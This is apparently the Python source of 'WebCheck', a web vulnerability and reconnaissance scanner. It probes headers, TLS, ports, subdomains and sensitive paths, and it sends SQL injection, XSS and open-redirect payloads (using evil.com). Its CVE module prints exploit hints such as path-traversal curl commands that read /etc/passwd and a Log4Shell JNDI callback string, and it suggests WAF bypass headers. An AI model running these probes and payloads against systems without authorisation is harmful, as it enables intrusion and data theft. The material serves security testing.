# -*- coding: utf-8 -*-
#!/usr/bin/env python3
"""
WebCheck v1.2 -- Web Vulnerability & Recon Tool
Usage: python3 webcheck.py [--target host] [--preset name] [--output html|json|txt] [--delay ms] [--hosts file]
.
"""

import sys, socket, ssl, json, re, time, os, argparse, ipaddress, base64
import urllib.request, urllib.error, urllib.parse
import concurrent.futures
from datetime import datetime

# -- colours -------------------------------------------------------------------
R="\033[91m"; Y="\033[93m"; G="\033[92m"; C="\033[96m"; B="\033[94m"
M="\033[95m"; W="\033[97m"; DIM="\033[2m"; BOLD="\033[1m"; RESET="\033[0m"

def ok(msg):    print(f"  {G}[+]{RESET} {msg}")
def warn(msg):  print(f"  {Y}[!]{RESET} {msg}")
def bad(msg):   print(f"  {R}[-]{RESET} {msg}")
def info(msg):  print(f"  {C}[*]{RESET} {msg}")
def dim(msg):   print(f"      {DIM}{msg}{RESET}")
def crit(msg):  print(f"  {R}{BOLD}[!!!]{RESET}{R} {msg}{RESET}")
def head(msg):  print(f"\n{BOLD}{B}{msg}{RESET}")

FINDINGS = []
SCAN_DELAY = 0.0

def finding(sev, module, detail):
    FINDINGS.append((sev, module, detail))

def throttle():
    if SCAN_DELAY > 0:
        time.sleep(SCAN_DELAY)

# -- utils ---------------------------------------------------------------------
def normalise(host):
    host = host.strip().rstrip("/")
    if not host.startswith(("http://","https://")):
        host = "https://" + host
    return host

def hostname_of(base):
    return re.sub(r"https?://","",base).split("/")[0].split(":")[0]

def root_domain(hostname):
    parts = hostname.split(".")
    return ".".join(parts[-2:]) if len(parts)>=2 else hostname

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) KnowItAll/3.0"

def fetch(url, timeout=9, method="GET", data=None, extra_headers=None):
    throttle()
    headers = {"User-Agent": UA}
    if extra_headers:
        headers.update(extra_headers)
    req = urllib.request.Request(
        url, headers=headers, method=method,
        data=data.encode() if isinstance(data, str) else data)
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=CTX) as r:
            return r.status, r.read(131072).decode("utf-8","replace"), r.headers
    except urllib.error.HTTPError as e:
        try:    body = e.read(4096).decode("utf-8","replace")
        except: body = ""
        return e.code, body, e.headers
    except Exception:
        return None, "", None

def hd(url, timeout=6):
    throttle()
    req = urllib.request.Request(url, method="HEAD", headers={"User-Agent": UA})
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=CTX) as r:
            return r.status, r.headers
    except urllib.error.HTTPError as e:
        return e.code, e.headers
    except Exception:
        return None, None

def banner():
    print(f"""{C}{BOLD} ________         __     ______ __                __    
|  |  |  |.-----.|  |--.|      |  |--.-----.----.|  |--.
|  |  |  ||  -__||  _  ||   ---|     |  -__|  __||    < 
|________||_____||_____||______|__|__|_____|____||__|__|
                                                        
{RESET}{DIM}  WebCheck v1.2 -- Web Vulnerability & Recon Tool 
                            by X3RX3S 
  https://github.com/X3RX3SSec insragram @mindfuckerrrr{RESET}
""")

# ==============================================================================
#  MODULE 1 -- Security Headers
# ==============================================================================
def check_headers(base):
    head("[01] Security Headers")
    code, body, hdrs = fetch(base)
    if not hdrs:
        bad("Could not fetch headers"); return
    required = {
        "Strict-Transport-Security": "HSTS missing -- SSL stripping possible",
        "Content-Security-Policy":   "CSP missing -- XSS risk elevated",
        "X-Frame-Options":           "Clickjacking protection missing",
        "X-Content-Type-Options":    "MIME sniffing protection missing",
        "Referrer-Policy":           "Referrer-Policy missing -- leaks URLs",
        "Permissions-Policy":        "Permissions-Policy not set",
    }
    leaky = ["Server","X-Powered-By","X-AspNet-Version","X-Generator",
             "X-Runtime","X-Version","X-Backend-Server"]
    for h, msg in required.items():
        v = hdrs.get(h)
        if v:
            ok(f"{h}: {DIM}{v}{RESET}")
            if h == "Strict-Transport-Security":
                age = re.search(r"max-age=(\d+)", v)
                if age and int(age.group(1)) < 31536000:
                    warn("  HSTS max-age below recommended 1 year")
            if h == "Content-Security-Policy" and "unsafe-inline" in v:
                warn("  CSP contains 'unsafe-inline' -- weakens XSS protection")
        else:
            bad(msg)
            finding("MEDIUM", "Headers", msg)
    print()
    for h in leaky:
        v = hdrs.get(h)
        if v:
            warn(f"Version disclosure  {h}: {Y}{v}{RESET}")
            finding("LOW", "Headers", f"Version disclosure: {h}: {v}")

# ==============================================================================
#  MODULE 2 -- TLS / SSL
# ==============================================================================
def check_tls(base):
    head("[02] TLS / SSL")
    hostname = hostname_of(base)
    try:
        ctx = ssl.create_default_context()
        with ctx.wrap_socket(socket.create_connection((hostname, 443), timeout=7),
                             server_hostname=hostname) as s:
            cert   = s.getpeercert()
            proto  = s.version()
            cipher = s.cipher()
        ok(f"Protocol : {proto}")
        ok(f"Cipher   : {cipher[0]}  (bits: {cipher[2]})")
        if cipher[2] and cipher[2] < 128:
            bad(f"Weak cipher strength: {cipher[2]} bits")
            finding("HIGH","TLS",f"Weak cipher: {cipher[0]}")
        exp_str = cert.get("notAfter","")
        if exp_str:
            exp  = datetime.strptime(exp_str, "%b %d %H:%M:%S %Y %Z")
            days = (exp - datetime.utcnow()).days
            if days < 0:
                crit(f"Certificate EXPIRED {abs(days)} days ago!")
                finding("CRITICAL","TLS","Cert expired")
            elif days < 14:
                bad(f"Cert expires in {days} days!")
                finding("HIGH","TLS",f"Cert expires in {days}d")
            elif days < 30:
                warn(f"Cert expires in {days} days")
            else:
                ok(f"Cert valid {days} more days")
        sans = [v for t,v in cert.get("subjectAltName",[]) if t=="DNS"]
        if sans:
            dim(f"SANs: {', '.join(sans[:10])}{'...' if len(sans)>10 else ''}")
    except ssl.SSLCertVerificationError:
        bad("Certificate validation failed (self-signed or invalid chain)")
        finding("MEDIUM","TLS","Invalid cert chain")
    except Exception as e:
        warn(f"TLS check error: {e}")
    for tls_ver, label in [(ssl.TLSVersion.TLSv1,"TLSv1.0"),
                            (ssl.TLSVersion.TLSv1_1,"TLSv1.1")]:
        try:
            c2 = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            c2.minimum_version = tls_ver
            c2.maximum_version = tls_ver
            c2.check_hostname  = False
            c2.verify_mode     = ssl.CERT_NONE
            with c2.wrap_socket(socket.create_connection((hostname, 443), timeout=4),
                                server_hostname=hostname):
                bad(f"Deprecated protocol accepted: {label}")
                finding("HIGH","TLS",f"Weak protocol: {label}")
        except Exception:
            ok(f"{label} not accepted")

# ==============================================================================
#  MODULE 3 -- Sensitive Paths
# ==============================================================================
def check_paths(base):
    head("[03] Sensitive Paths & Info Disclosure")
    paths = [
        "/.env","/.env.local","/.env.production","/.env.backup","/.env.dev",
        "/config.php","/config.yml","/config.yaml","/config.json",
        "/configuration.php","/settings.py","/settings.php",
        "/secrets.json","/.aws/credentials","/wp-config.php",
        "/web.config","/.htaccess","/.htpasswd",
        "/.git/HEAD","/.git/config","/.git/COMMIT_EDITMSG","/.git/logs/HEAD",
        "/.svn/entries","/.hg/store",
        "/admin","/admin/","/wp-admin/","/administrator/","/panel/",
        "/phpmyadmin/","/pma/","/login","/dashboard",
        "/api/","/api/v1/","/api/v2/","/graphql","/graphiql",
        "/swagger.json","/swagger-ui.html","/openapi.json","/api-docs",
        "/backup.zip","/backup.tar.gz","/dump.sql","/db.sql","/.DS_Store",
        "/robots.txt","/sitemap.xml","/security.txt","/.well-known/security.txt",
        "/server-status","/server-info","/actuator/","/actuator/health",
        "/actuator/env","/actuator/mappings","/metrics","/health",
        "/_profiler/","/telescope/","/horizon/",
        "/.gitlab-ci.yml","/.travis.yml","/.circleci/config.yml",
        "/Dockerfile","/docker-compose.yml","/package.json","/composer.json",
        "/CHANGELOG.md","/README.md","/VERSION",
    ]
    found = []
    def probe(path):
        code, hdrs = hd(base+path, timeout=5)
        return path, code, hdrs
    with concurrent.futures.ThreadPoolExecutor(max_workers=25) as ex:
        for path, code, hdrs in ex.map(probe, paths):
            ct = hdrs.get("Content-Type","") if hdrs else ""
            if code == 200:
                bad(f"HTTP 200  {path}  {DIM}{ct}{RESET}")
                found.append(path)
                finding("HIGH","Paths",f"Accessible: {path}")
            elif code == 403:
                warn(f"HTTP 403  {path}  {DIM}(exists){RESET}")
                found.append(path)
                finding("LOW","Paths",f"Exists (403): {path}")
    if not found:
        ok("No sensitive paths exposed")
    return found

# ==============================================================================
#  MODULE 4 -- Cookie Security
# ==============================================================================
def check_cookies(base):
    head("[04] Cookie Security")
    _, _, hdrs = fetch(base)
    if not hdrs:
        warn("Could not check cookies"); return
    raw = re.findall(r"Set-Cookie: ([^\r\n]+)", str(hdrs), re.IGNORECASE)
    if not raw:
        info("No cookies set on root path"); return
    for cookie in raw:
        name = cookie.split("=")[0].strip()
        cl   = cookie.lower()
        issues = []
        if "httponly" not in cl: issues.append("HttpOnly missing")
        if "secure"   not in cl: issues.append("Secure missing")
        if "samesite" not in cl: issues.append("SameSite missing")
        if issues:
            warn(f"Cookie '{Y}{name}{RESET}': {', '.join(issues)}")
            finding("MEDIUM","Cookies",f"{name}: {', '.join(issues)}")
        else:
            ok(f"Cookie '{name}': all flags set")

# ==============================================================================
#  MODULE 5 -- CORS
# ==============================================================================
def check_cors(base):
    head("[05] CORS Misconfiguration")
    for origin in ["https://evil.com","null"]:
        code, body, hdrs = fetch(base, extra_headers={"Origin": origin})
        if not hdrs: continue
        acao = hdrs.get("Access-Control-Allow-Origin","")
        acac = hdrs.get("Access-Control-Allow-Credentials","")
        if not acao:
            ok("No ACAO header"); return
        if acao == "*":
            warn(f"ACAO: wildcard (origin: {origin})")
            finding("LOW","CORS","Wildcard ACAO")
        elif origin in acao:
            bad(f"ACAO reflects arbitrary origin '{origin}'!")
            finding("HIGH","CORS",f"Origin reflection: {origin}")
            if acac.lower() == "true":
                crit("ACAC: true + reflected origin -- credentials exposed!")
                finding("CRITICAL","CORS","Credentials exposed via CORS reflection")
        else:
            ok(f"ACAO: {acao}")
        break

# ==============================================================================
#  MODULE 6 -- HTTP Methods
# ==============================================================================
def check_methods(base):
    head("[06] Dangerous HTTP Methods")
    for method in ["OPTIONS","PUT","DELETE","TRACE","PATCH","PROPFIND"]:
        code, body, hdrs = fetch(base, method=method)
        allow = hdrs.get("Allow","") if hdrs else ""
        if method == "OPTIONS" and allow:
            dangerous = [m.strip() for m in allow.split(",")
                         if m.strip() in ("PUT","DELETE","TRACE")]
            if dangerous:
                bad(f"OPTIONS Allow: {allow} -- dangerous: {', '.join(dangerous)}")
                finding("MEDIUM","Methods",f"Dangerous methods: {dangerous}")
            else:
                ok(f"Allow: {allow}")
            continue
        if method == "TRACE" and code == 200:
            bad("TRACE enabled -- XST possible!")
            finding("HIGH","Methods","TRACE enabled")
        elif method in ("PUT","DELETE") and code in (200,201,204):
            bad(f"{method} -> HTTP {code} -- file manipulation possible!")
            finding("HIGH","Methods",f"{method} allowed")
        elif code == 405:
            ok(f"{method} -> 405 Not Allowed")
        elif code:
            dim(f"{method} -> {code}")

# ==============================================================================
#  MODULE 7 -- Port Scan + Banner Grabbing
# ==============================================================================
def check_ports(base):
    head("[07] Port Scan + Banner Grabbing")
    hostname = hostname_of(base)
    ports = {
        21:"FTP", 22:"SSH", 23:"Telnet", 25:"SMTP", 53:"DNS",
        80:"HTTP", 110:"POP3", 143:"IMAP", 443:"HTTPS",
        445:"SMB", 587:"SMTP/TLS", 993:"IMAPS", 995:"POP3S",
        1433:"MSSQL", 1521:"Oracle", 3306:"MySQL", 3389:"RDP",
        4443:"Alt-HTTPS", 5432:"PostgreSQL", 5900:"VNC",
        6379:"Redis", 7001:"WebLogic", 8000:"HTTP-Alt",
        8080:"HTTP-Proxy", 8443:"HTTPS-Alt", 8888:"Jupyter",
        9200:"Elasticsearch", 27017:"MongoDB",
    }
    risky = {
        23:"Telnet plaintext", 21:"FTP plaintext", 5900:"VNC",
        6379:"Redis (often unauth)", 9200:"Elasticsearch (often unauth)",
        27017:"MongoDB (often unauth)", 3389:"RDP exposed",
    }

    def scan_port(port):
        try:
            s = socket.create_connection((hostname, port), timeout=1.5)
            banner_txt = ""
            try:
                s.settimeout(1.5)
                if port not in (443,8443,4443):
                    s.sendall(b"HEAD / HTTP/1.0\r\n\r\n")
                    banner_txt = s.recv(256).decode("utf-8","replace").strip().split("\n")[0]
            except Exception:
                pass
            s.close()
            return port, banner_txt
        except Exception:
            return None, None

    info(f"Scanning {len(ports)} ports on {hostname}...")
    open_ports = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
        futs = {ex.submit(scan_port, p): p for p in ports}
        for f in concurrent.futures.as_completed(futs):
            port, bnr = f.result()
            if port:
                svc = ports.get(port,"unknown")
                if port in risky:
                    bad(f"Port {port:<6} {svc:<18} <- {risky[port]}")
                    finding("HIGH","Ports",f"Risky port: {port}/{svc}")
                else:
                    ok(f"Port {port:<6} {svc}")
                if bnr:
                    dim(f"Banner: {bnr[:100]}")
                    finding("INFO","Ports",f"Banner {port}: {bnr[:80]}")
                open_ports.append(port)
    if not open_ports:
        info("No common ports open (or host is firewalled)")
    return open_ports

# ==============================================================================
#  MODULE 8 -- Technology Fingerprinting
# ==============================================================================
def check_tech(base):
    head("[08] Technology Fingerprinting")
    code, body, hdrs = fetch(base)
    if not hdrs:
        warn("Could not fingerprint"); return {}
    detected = {}
    hdr_str  = str(hdrs).lower()
    body_low = body.lower()
    for h in ["Server","X-Powered-By","X-Generator","Via"]:
        v = hdrs.get(h)
        if v: detected[h] = v
    sigs = {
        "WordPress":      ["wp-content/","wp-includes/","wp-json/"],
        "Drupal":         ["drupal.js","sites/default/files","x-drupal"],
        "Joomla":         ["/components/com_","joomla!"],
        "Laravel":        ["laravel_session","laravel/"],
        "Django":         ["csrfmiddlewaretoken","django"],
        "Flask":          ["werkzeug","flask"],
        "Ruby on Rails":  ["x-runtime","x-powered-by: phusion"],
        "Spring Boot":    ["whitelabel error page","spring"],
        "ASP.NET":        ["__viewstate","asp.net","__dopostback"],
        "Node/Express":   ["x-powered-by: express"],
        "React":          ["__reactfiber","react.production.min"],
        "Angular":        ["ng-version=","ng-app"],
        "Vue.js":         ["__vue__","v-bind"],
        "jQuery":         ["jquery.min.js","jquery-"],
        "Bootstrap":      ["bootstrap.min.css"],
        "Shopify":        ["cdn.shopify.com"],
        "Cloudflare":     ["cf-ray","cloudflare"],
        "PHP":            ["phpsessid","x-powered-by: php"],
        "Nginx":          ["nginx"],
        "Apache":         ["apache"],
    }
    for tech, patterns in sigs.items():
        if any(p in body_low or p in hdr_str for p in patterns):
            detected[tech] = "detected"
    for k, v in detected.items():
        tag = f"{DIM}{v}{RESET}" if v != "detected" else ""
        info(f"{k}  {tag}")
        finding("INFO","Tech",f"{k}: {v}")
    server = hdrs.get("Server","")
    php    = hdrs.get("X-Powered-By","")
    if re.search(r"Apache/2\.[0-3]\.", server):
        warn(f"Older Apache -- check CVEs: {server}")
        finding("MEDIUM","Tech",f"Outdated: {server}")
    if re.search(r"PHP/[5-7]\.[0-3]\.", php):
        warn(f"Outdated PHP: {php} -- multiple CVEs")
        finding("HIGH","Tech",f"Outdated PHP: {php}")
    return detected

# ==============================================================================
#  MODULE 9 -- CVE Scan + Exploit Suggester
# ==============================================================================
def check_cve(base):
    head("[09] CVE Scan & Exploit Suggester")
    code, body, hdrs = fetch(base)
    if not hdrs:
        warn("Could not scan for CVEs"); return
    server = hdrs.get("Server","")
    php    = hdrs.get("X-Powered-By","")
    body_l = body.lower()
    hdr_s  = str(hdrs)
    scan   = body_l + " " + hdr_s.lower() + " " + server.lower() + " " + php.lower()
    cve_db = [
        (r"Apache/2\.4\.4[89]",    "CVE-2021-41773", 9.8,
         "Path traversal + RCE Apache 2.4.49",
         "curl 'http://TARGET/cgi-bin/.%2e/.%2e/.%2e/etc/passwd'"),
        (r"Apache/2\.4\.50",       "CVE-2021-42013", 9.8,
         "Path traversal bypass Apache 2.4.50",
         "curl 'http://TARGET/cgi-bin/%%32%65%%32%65/etc/passwd'"),
        (r"Apache/2\.[0-3]\.",     "CVE-2017-9798",  7.5,
         "Optionsbleed -- memory leak in OPTIONS",
         "Send OPTIONS request and inspect Allow header for garbage bytes"),
        (r"nginx/1\.(1[0-5])\.",   "CVE-2019-9511",  7.5,
         "HTTP/2 Data Dribble DoS",
         "h2load -n 100000 -c 100 -m 100 TARGET"),
        (r"PHP/5\.[0-6]\.",        "CVE-2019-11043", 9.8,
         "PHP-FPM RCE via nginx misconfiguration",
         "github.com/neex/phuip-fpizdam TARGET"),
        (r"PHP/7\.[0-3]\.",        "CVE-2019-11043", 9.8,
         "PHP-FPM RCE affects 7.x",
         "github.com/neex/phuip-fpizdam TARGET"),
        (r"OpenSSL/1\.0\.[01]",    "CVE-2014-0160",  7.5,
         "Heartbleed -- server memory read via TLS heartbeat",
         "python heartbleed.py TARGET:443"),
        ("wp-content",             "CVE-2023-2745",  6.4,
         "WordPress directory traversal below 6.2.1",
         "GET /wp-json/wp/v2/global-styles/1?context=edit"),
        ("wp-login.php",           "CVE-2017-8295",  5.0,
         "WordPress Host header email injection",
         "Modify Host header in password-reset request"),
        ("sites/default/files",    "CVE-2018-7600",  9.8,
         "Drupalgeddon2 -- unauthenticated RCE",
         "github.com/dreadlocked/Drupalgeddon2"),
        ("/components/com_",       "CVE-2023-23752", 5.3,
         "Joomla config info disclosure",
         "GET /api/index.php/v1/config/application?public=true"),
        ("telerik",                "CVE-2019-18935", 9.8,
         "Telerik UI ASP.NET deserialization RCE",
         "Upload handler at Telerik.Web.UI.WebResource.axd"),
        ("whitelabel error page",  "CVE-2022-22965", 9.8,
         "Spring4Shell -- Spring MVC DataBinder RCE",
         "POST class.module.classLoader.resources.context.parent.pipeline..."),
        ("log4j",                  "CVE-2021-44228", 10.0,
         "Log4Shell -- JNDI injection via user-controlled log input",
         "Inject ${jndi:ldap://CALLBACK/a} in User-Agent and all headers"),
        ("elasticsearch",          "CVE-2015-1427",  10.0,
         "Elasticsearch Groovy sandbox RCE",
         "POST /_search with script:{lang:groovy,script:'...'}"),
        (r"jquery[/-](1\.[0-9]|2\.[0-2]|3\.[0-4])", "CVE-2020-11022", 6.1,
         "jQuery XSS via DOM manipulation",
         "Audit $.html() and .append() calls with user-controlled input"),
        ("struts",                 "CVE-2017-5638",  10.0,
         "Struts2 RCE via Content-Type header",
         "Set Content-Type: %{(#_='multipart/form-data')...}"),
        (r"IIS/[67]\.",            "CVE-2017-7269",  9.8,
         "IIS 6/7 WebDAV buffer overflow RCE",
         "Use iis-webdav-sc exploit module in Metasploit"),
        ("jboss",                  "CVE-2017-12149", 9.8,
         "JBoss deserialization RCE",
         "POST /invoker/readonly with serialized Java object"),
        ("jenkins",                "CVE-2024-23897", 9.8,
         "Jenkins arbitrary file read via CLI",
         "java -jar jenkins-cli.jar -s URL help @/etc/passwd"),
    ]
    found_cves = []
    for pattern, cve, cvss, desc, exploit in cve_db:
        if re.search(pattern, scan, re.IGNORECASE):
            color = R if cvss >= 9 else Y if cvss >= 7 else C
            print(f"\n  {color}{BOLD}[CVE] {cve}  CVSS {cvss}{RESET}")
            print(f"  {W}{desc}{RESET}")
            print(f"  {DIM}Exploit hint: {exploit}{RESET}")
            sev = "CRITICAL" if cvss>=9 else "HIGH" if cvss>=7 else "MEDIUM"
            finding(sev,"CVE",f"{cve} (CVSS {cvss}): {desc}")
            found_cves.append(cve)
    if server:
        product = re.sub(r"[^\w\s]","",server).split("/")[0].strip()
        if product:
            info(f"Querying NVD API for '{product}'...")
            try:
                nvd_url = (f"https://services.nvd.nist.gov/rest/json/cves/2.0"
                           f"?keywordSearch={urllib.parse.quote(product)}&resultsPerPage=5")
                nvd_code, nvd_body, _ = fetch(nvd_url, timeout=10)
                if nvd_code == 200:
                    data = json.loads(nvd_body)
                    for v in data.get("vulnerabilities",[])[:5]:
                        cid   = v.get("cve",{}).get("id","?")
                        descs = v.get("cve",{}).get("descriptions",[])
                        dtxt  = next((d["value"] for d in descs if d["lang"]=="en"),"")[:100]
                        metrics = v.get("cve",{}).get("metrics",{})
                        score = "?"
                        for mk in ["cvssMetricV31","cvssMetricV30","cvssMetricV2"]:
                            if mk in metrics:
                                score = metrics[mk][0].get("cvssData",{}).get("baseScore","?")
                                break
                        col = R if str(score)>="9" else Y if str(score)>="7" else C
                        print(f"  {col}[NVD] {cid}  score={score}{RESET}  {DIM}{dtxt}{RESET}")
            except Exception as e:
                dim(f"NVD query failed: {e}")
    if not found_cves:
        ok("No signature-matched CVEs detected")

# ==============================================================================
#  MODULE 10 -- SQL Injection Probes
# ==============================================================================
def check_sqli(base):
    head("[10] SQL Injection Probes")
    error_sigs = [
        "you have an error in your sql syntax","warning: mysql",
        "unclosed quotation mark","quoted string not properly terminated",
        "org.postgresql","pg::syntaxerror","microsoft ole db",
        "invalid column name","odbc sql server","sqlexception",
        "sqlite3::exception","ora-01756","ora-00907","syntax error",
    ]
    payloads = [
        ("'",                  "single-quote"),
        ("' OR '1'='1",        "OR bypass"),
        ("' OR 1=1--",         "comment bypass"),
        ("' UNION SELECT NULL--","UNION probe"),
        ("' AND SLEEP(2)--",   "time-based blind"),
        ("1 AND 1=2",          "boolean false"),
        ("admin'--",           "admin bypass"),
        ("; SELECT SLEEP(2)--","stacked time-based"),
    ]
    params = ["id","page","q","search","user","name","cat","category",
              "item","product","order","sort","filter","type","key",
              "p","s","query","term","view","article","pid","cid"]
    for param in params[:6]:
        for payload, label in payloads:
            url = f"{base}/?{param}={urllib.parse.quote(payload)}"
            t0  = time.time()
            code, body, hdrs = fetch(url, timeout=12)
            elapsed = time.time() - t0
            body_l  = body.lower()
            if any(sig in body_l for sig in error_sigs):
                bad(f"SQL error on ?{param}={payload!r} ({label})")
                finding("HIGH","SQLi",f"Error-based SQLi in '{param}'")
                return
            if "sleep" in payload and elapsed >= 1.9:
                bad(f"Time-based blind SQLi? param={param} delay={elapsed:.1f}s")
                finding("HIGH","SQLi",f"Time-based blind in '{param}'")
                return
    ok("No obvious SQL injection signatures detected")

# ==============================================================================
#  MODULE 11 -- XSS Probes
# ==============================================================================
def check_xss(base):
    head("[11] XSS Probes")
    payloads = [
        ("<script>alert(1)</script>",         "script tag"),
        ("<img src=x onerror=alert(1)>",      "img onerror"),
        ("'\"><svg onload=alert(1)>",         "SVG onload"),
        ("</title><script>alert(1)</script>", "title break"),
        ("<body onload=alert(1)>",            "body onload"),
        ("javascript:alert(1)",               "JS protocol"),
    ]
    params = ["q","s","search","query","term","name","input","text",
              "msg","comment","content","title","url","ref","page","id"]
    for param in params[:6]:
        for payload, label in payloads:
            url = f"{base}/?{param}={urllib.parse.quote(payload)}"
            code, body, hdrs = fetch(url, timeout=8)
            if not body: continue
            ct = hdrs.get("Content-Type","") if hdrs else ""
            if "html" not in ct.lower(): continue
            if payload.lower() in body.lower():
                bad(f"Payload reflected unencoded: param={param} ({label})")
                finding("HIGH","XSS",f"Reflected XSS: param={param}, {label}")
                csp = hdrs.get("Content-Security-Policy","") if hdrs else ""
                if not csp:
                    bad("  No CSP -- exploit may execute directly!")
                else:
                    warn("  CSP present -- verify if it blocks this vector")
                return
    ok("No reflected XSS signatures found")

# ==============================================================================
#  MODULE 12 -- Open Redirect
# ==============================================================================
def check_redirect(base):
    head("[12] Open Redirect")
    params   = ["redirect","url","next","return","goto","target","dest",
                "destination","redir","redirect_uri","return_url","forward"]
    payloads = ["https://evil.com","//evil.com","///evil.com"]
    for param in params:
        for payload in payloads:
            url  = f"{base}/?{param}={urllib.parse.quote(payload)}"
            code, _, hdrs = fetch(url, timeout=7)
            if hdrs and code in (301,302,303,307,308):
                loc = hdrs.get("Location","")
                if "evil.com" in loc or loc.startswith("//"):
                    bad(f"Open redirect: ?{param}={payload} -> {loc}")
                    finding("MEDIUM","Redirect",f"Open redirect via '{param}'")
                    return
    ok("No open redirect detected")

# ==============================================================================
#  MODULE 13 -- Subdomain Enumeration
# ==============================================================================
def check_subdomains(base):
    head("[13] Subdomain Enumeration")
    hostname = hostname_of(base)
    root     = root_domain(hostname)
    wordlist = [
        "www","www2","mail","smtp","pop","imap","mx","mx1","mx2",
        "ftp","sftp","ssh","vpn","remote","rdp","citrix",
        "admin","portal","panel","manage","console","dashboard",
        "api","api2","api-dev","rest","ws","app","apps",
        "dev","development","staging","stage","test","testing","qa","uat","demo",
        "beta","alpha","preview","sandbox","canary",
        "blog","shop","store","pay","checkout","billing",
        "cdn","static","assets","img","images","media","files","upload",
        "git","gitlab","github","svn","jenkins","jira","confluence",
        "kibana","grafana","prometheus","monitor","metrics","logs",
        "auth","sso","login","oauth","id","accounts",
        "support","help","docs","kb","forum","community",
        "ns","ns1","ns2","dns","dns1","dns2",
        "db","mysql","postgres","redis","mongo","elastic",
        "internal","intranet","corp","office","vpn2",
        "old","legacy","backup","bak","archive","v1","v2",
    ]
    found = []
    def resolve(sub):
        fqdn = f"{sub}.{root}"
        try:
            ip = socket.gethostbyname(fqdn)
            return fqdn, ip
        except Exception:
            return None, None
    with concurrent.futures.ThreadPoolExecutor(max_workers=40) as ex:
        for fqdn, ip in ex.map(resolve, wordlist):
            if fqdn:
                ok(f"{fqdn}  ->  {ip}")
                found.append(fqdn)
                for kw in ["admin","dev","staging","test","api","git","jenkins","kibana"]:
                    if kw in fqdn:
                        finding("MEDIUM","Subdomains",f"Interesting: {fqdn} ({ip})")
                        break
    if not found:
        info("No common subdomains resolved")
    return found

# ==============================================================================
#  MODULE 14 -- DNS Records & Email Security
# ==============================================================================
def check_dns(base):
    head("[14] DNS Records & Email Security")
    hostname = hostname_of(base)
    root     = root_domain(hostname)
    try:
        infos = socket.getaddrinfo(hostname, None)
        seen  = set()
        for r in infos:
            ip = r[4][0]
            if ip not in seen:
                ok(f"A/AAAA   {hostname}  ->  {ip}")
                seen.add(ip)
    except Exception as e:
        warn(f"DNS lookup failed: {e}")
    for qname, qtype, label in [
        (root,              "MX",  "MX"),
        (root,              "TXT", "TXT/SPF"),
        (f"_dmarc.{root}",  "TXT", "TXT/DMARC"),
    ]:
        url = f"https://dns.google/resolve?name={qname}&type={qtype}"
        try:
            _, body, _ = fetch(url, timeout=7)
            data    = json.loads(body)
            answers = data.get("Answer",[])
            if not answers:
                if label == "TXT/SPF":
                    bad("No SPF record -- email spoofing possible!")
                    finding("HIGH","DNS","No SPF -- spoofing risk")
                elif label == "TXT/DMARC":
                    bad("No DMARC record -- phishing domain risk!")
                    finding("HIGH","DNS","No DMARC record")
                continue
            for a in answers[:3]:
                val = a.get("data","")
                if label == "TXT/SPF"   and "spf"   not in val.lower(): continue
                if label == "TXT/DMARC" and "dmarc" not in val.lower(): continue
                ok(f"{label}: {val[:90]}")
                if label == "TXT/DMARC" and "p=none" in val.lower():
                    warn("DMARC p=none -- not enforced")
                    finding("MEDIUM","DNS","DMARC p=none")
                if label == "TXT/SPF" and "+all" in val:
                    bad("SPF +all -- ANY server can send as this domain!")
                    finding("HIGH","DNS","SPF +all -- spoofing trivial")
        except Exception:
            pass

# ==============================================================================
#  MODULE 15 -- WAF / CDN Detection
# ==============================================================================
def check_waf(base):
    head("[15] WAF / CDN Detection")
    _, _, hdrs = fetch(base)
    if not hdrs:
        warn("Could not detect WAF"); return
    waf_sigs = {
        "Cloudflare":    ["cf-ray","cf-cache-status","cloudflare"],
        "AWS CloudFront":["x-amz-cf-id","x-amz-cf-pop"],
        "Akamai":        ["x-check-cacheable","akamaighost"],
        "Fastly":        ["x-served-by","x-cache-hits"],
        "Sucuri":        ["x-sucuri-id","x-sucuri-cache"],
        "Incapsula":     ["x-iinfo","incap_ses"],
        "F5 BIG-IP":     ["bigipserver","x-cnection"],
        "Varnish":       ["x-varnish","via: varnish"],
        "ModSecurity":   ["mod_security","modsecurity"],
        "Imperva":       ["x-iinfo"],
    }
    hdr_str  = str(hdrs).lower()
    detected = [n for n,sigs in waf_sigs.items() if any(s in hdr_str for s in sigs)]
    if detected:
        ok(f"WAF/CDN detected: {', '.join(detected)}")
        info("Bypass hints: X-Forwarded-For: 127.0.0.1 / X-Originating-IP: 127.0.0.1")
    else:
        warn("No WAF/CDN detected -- origin may be directly reachable")
        finding("LOW","WAF","No WAF detected")
    for h in ["Server","Via","X-Cache","Age"]:
        v = hdrs.get(h)
        if v: dim(f"{h}: {v}")

# ==============================================================================
#  MODULE 16 -- JS Secret Scanner
# ==============================================================================
def check_js_secrets(base):
    head("[16] JavaScript Secret Scanner")
    _, body, _ = fetch(base)
    js_files = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', body, re.IGNORECASE)
    js_files = [f if f.startswith("http") else base.rstrip("/")+"/"+f.lstrip("/")
                for f in js_files if "google" not in f and "cdn" not in f][:12]
    secret_patterns = [
        (r"(?:api[_-]?key|apikey)\s*[:=]\s*['\"]([a-zA-Z0-9_\-]{16,})['\"]",  "API Key"),
        (r"(?:secret|password|passwd)\s*[:=]\s*['\"]([^'\"]{8,})['\"]",        "Credential"),
        (r"(?:token|access_token|auth_token)\s*[:=]\s*['\"]([a-zA-Z0-9_.]{20,})['\"]","Token"),
        (r"AKIA[0-9A-Z]{16}",                                                    "AWS Access Key"),
        (r"AIza[0-9A-Za-z_\-]{35}",                                              "Google API Key"),
        (r"-----BEGIN (?:RSA|EC|OPENSSH) PRIVATE KEY-----",                      "PEM Private Key"),
        (r"eyJ[a-zA-Z0-9_\-]{10,}\.[a-zA-Z0-9_\-]{10,}\.[a-zA-Z0-9_\-]{10,}", "JWT"),
        (r"mongodb(?:\+srv)?://[^\s'\"]+",                                        "MongoDB URI"),
        (r"(?:mysql|postgres|redis)://[^\s'\"]+",                                 "DB URI"),
        (r"https://hooks\.slack\.com/services/[A-Z0-9/]+",                        "Slack Webhook"),
        (r"https://discord(?:app)?\.com/api/webhooks/[0-9]+/[a-zA-Z0-9_\-]+",   "Discord Webhook"),
